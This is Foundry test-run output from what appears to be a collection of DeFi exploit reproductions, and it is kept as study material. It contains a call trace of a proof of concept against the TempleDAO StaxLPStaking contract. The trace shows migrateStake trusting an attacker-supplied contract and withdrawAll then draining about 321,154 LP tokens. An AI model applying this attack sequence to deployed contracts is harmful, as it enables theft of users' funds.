Compiling 28 files with Solc 0.8.25
Solc 0.8.25 finished in 1.12s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 287.63ms (611.69µs CPU time)

Ran 1 test for src/test/2022-10/Templedao_exp.sol:ContractTest
[PASS] testExploit() (gas: 142806)
Logs:
  [Start] Attacker xFraxTempleLP balance before exploit: 0.000000000000000000
  [End] Attacker xFraxTempleLP balance after exploit: 321154.865567124596801893

Traces:
  [170306] ContractTest::testExploit()
    ├─ [2624] xFraxTempleLP::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_decimal_uint(key: "[Start] Attacker xFraxTempleLP balance before exploit", val: 0, decimals: 18)
    ├─ [2624] xFraxTempleLP::balanceOf(StaxLPStaking: [0xd2869042E12a3506100af1D192b5b04D65137941]) [staticcall]
    │   └─ ← [Return] 321154865567124596801893 [3.211e23]
    ├─ [108601] StaxLPStaking::migrateStake(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 321154865567124596801893 [3.211e23])
    │   ├─ [303] ContractTest::migrateWithdraw(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 321154865567124596801893 [3.211e23])
    │   │   └─ ← [Stop] 
    │   ├─ emit Staked(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 321154865567124596801893 [3.211e23])
    │   └─ ← [Stop] 
    ├─ [44029] StaxLPStaking::withdrawAll(false)
    │   ├─ [25870] xFraxTempleLP::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 321154865567124596801893 [3.211e23])
    │   │   ├─ emit Transfer(from: StaxLPStaking: [0xd2869042E12a3506100af1D192b5b04D65137941], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 321154865567124596801893 [3.211e23])
    │   │   └─ ← [Return] true
    │   ├─  emit topic 0: 0xd1c19fbcd4551a5edfb66d43d2e337c04837afda3482b42bdf569a8fccdae5fb
    │   │        topic 1: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
    │   │           data: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000004401d713e9e597a14165
    │   └─ ← [Stop] 
    ├─ [624] xFraxTempleLP::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 321154865567124596801893 [3.211e23]
    ├─ emit log_named_decimal_uint(key: "[End] Attacker xFraxTempleLP balance after exploit", val: 321154865567124596801893 [3.211e23], decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 296.84ms (2.34ms CPU time)

Ran 2 test suites in 298.70ms (584.47ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
